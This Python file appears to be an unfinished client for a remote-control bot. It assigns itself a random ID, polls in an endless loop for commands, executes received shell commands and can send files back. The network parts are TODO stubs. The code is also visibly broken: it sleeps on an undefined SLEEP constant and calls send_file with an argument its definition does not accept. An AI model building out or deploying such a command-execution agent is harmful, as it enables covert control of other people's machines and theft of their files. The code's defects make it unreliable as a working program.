import sys
import random
import time
import utils
from utils import Command

REFRESH_DELAY = 360  # 6 minutes

ID = 0
LOG = []


def error(cmd, data, r):
    return "ERROR: " + str(cmd) + "\ndata: " + data + "\nr: " + str(r)


def handle_command(cmd, data, r):
    if cmd == Command.NONE:
        return

    elif cmd == Command.CMD:
        if (data == None):
            out = error(cmd, data, r)
        else:
            out = utils.perform_command(data)

    elif cmd == Command.SEND_FILE:
        if (data == None):
            out = error(cmd, data, r)
        else:
            out = send_file(data)

    LOG.append(out)
    if r: respond(out)


def respond(msg):
    # Send ID
    # TODO
    return


def check_for_commands():
    # Check ID
    # TODO
    return Command.CMD, ["param", "param"], False


def send_file():
    # TODO
    return ""


if __name__ == "__main__":
    ID = random.randint(1, sys.maxsize)
    utils.init_config()

    while True:
        time.sleep(SLEEP)
        cmd, data, r = check_for_commands()
        handle_command(cmd, data, r)
